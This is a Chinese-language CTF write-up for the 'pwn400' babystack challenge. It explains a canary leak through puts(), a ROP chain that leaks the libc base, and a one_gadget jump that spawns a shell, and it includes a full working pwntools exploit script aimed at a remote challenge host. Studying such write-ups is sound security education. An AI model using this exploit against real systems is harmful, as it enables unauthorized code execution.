#pwn400
##分析
![](https://i.imgur.com/A96PIT2.png)  
这道题主要的障碍就是开启了栈保护，不能随意进行栈溢出，所以我们首先需要绕过金丝雀的限制。  

经过查看，这个程序有两个输入点①输入选项数，②store选项中输入字符串s。  
这里利用了输出字符串s的过程，将canary泄露出来
####条件基础：  
①canary为防止泄露，第一位已知为'\x00'  
②puts()函数输出时，遇到'\x00'才停止，即使字符串中存在'\n',也会继续输出  
③read函数在读取长度限制内，能够把'\n'也读进字符串中

##解题思路
主函数的栈结构如图所示
 ![](https://i.imgur.com/x1TVvBT.png)  
所以可以通过将s填充满，使puts(s)时将canary泄露出来。  
另外一个问题是，虽然程序本身没有开启随机地址，但是其链接库开启了PIE保护，所以我们需要两次溢出：先获得函数地址在libc库中的偏移，进而得到需要函数在内存中的真实地址，然后在溢出执行system函数获取shell。  

##Exp
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-
    __Auther__ = 'M4x'
    
    from pwn import * 
    import sys
    from time import sleep
    context.log_level = "debug"
    # context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
    
    def debug():
        addr = int(raw_input("DEBUG: "), 16)
        gdb.attach(io, "b *" + str(addr))
    
    if sys.argv[1] == "l":
        io = process("./babystack")
        elf = ELF("./babystack")
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        exe_addr = 0x3f2d6
    else:
        io = remote("1c6a6fb.isec.anscen.cn", 1234)
        elf = ELF("./babystack")
        libc = ELF("./libc-2.23.so")
        exe_addr = 0x45216
    
    def getCanary():
        io.sendlineafter(">> ", "1")
        payload = cyclic(0x88)
        #  debug()
        io.sendline(payload)
        io.sendlineafter(">> ", "2")
        sleep(1)
        io.recvuntil("\n")
        sleep(1)
        canary = u64("\x00" + io.recv(7))
        #  print hex(canary)
        log.debug("leaked canary -> 0x%x" % canary)
        return canary
    
    def getBase(canary):
        read_got = elf.got["read"]
        read_plt = elf.plt["read"]
        puts_plt = elf.plt["puts"]
        #  start_plt = elf.symbols["start"]
        #  start_plt = 0x400720
        start_plt = 0x400908
        pop_rdi_ret = 0x0000000000400a93
        pop_rsi_r15_ret = 0x0000000000400a91
        io.sendlineafter(">> ", "1")
        #  log.info("------------------")
        payload = cyclic(0x88) + p64(canary) * 2 + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(start_plt)
        #  print len(payload)
        io.sendline(payload)
        io.sendlineafter(">> ", "3")
        #  debug()
        #  log.info("------------------")
        sleep(1)
        read_leaked = u64(io.recv(6).ljust(8, '\x00'))
        log.debug("read_leaked -> 0x%x" % read_leaked)
        read_libc = libc.symbols["read"]
        libc_base = read_leaked - read_libc
        log.debug("leaked libcBase -> 0x%x" % libc_base)
        return libc_base
    
    def getShell(canary, libcBase):
        io.sendlineafter(">> ", "1")
        exeAddr = libcBase + exe_addr
        payload = cyclic(0x88) + p64(canary) * 2 + p64(exeAddr)
        io.sendline(payload)
        #  debug()
        io.sendlineafter(">> ", "3")
    
        io.interactive()
        io.close()
    
    if __name__ == "__main__":
        canary = getCanary()
        libcBase = getBase(canary)
        canary = getCanary()
        getShell(canary, libcBase)

脚本相比之前写过的略长，简单解释一下  
脚本分为获取canary；获得链接库地址偏移；获取shell三个部分，结构比较清晰。  
先发送0x88长度的字符串+'\n'，read函数会读进0x89个字节，并将canary第一个字节覆盖，之后puts便能将canary泄露出来。  
泄露链接库地址基址时，只需将canary的位置使用上一步中泄露出来的canary进行覆盖，获取链接库地址偏移和寄存器利用，详见<a href = "http://www.cnblogs.com/ZHijack/p/7900736.html" target = blank>ret2libc尝试</a>和<a href = "http://www.cnblogs.com/ZHijack/p/7940686.html" target = blank>64位简单栈溢出</a>。最后返回start函数，重新执行。  
重新执行函数后，需重新泄露canary，然后进行溢出，即可获得shell。
此处的exeaddr不同于以往ROPgadget找到"/bin/sh"和system函数的地址，是用onegadget直接找到execve("/bin/sh", rsp+0x30, environ)的地址，所以只需跳转到此地址即可获得shell。

![](https://i.imgur.com/2Gj0xZ9.png)

但one_gadget不能保证需要限制寄存器的值,不能保证每次都有效,本题使用one_gadget而不是比较保险的system("/bin/sh")是因为输入长度有限,只能构造很短的ropchain.

除此之外,如果one_gadget失效,还可以试一下另一种方法[stack pivot](https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/others.html#stack-privot)

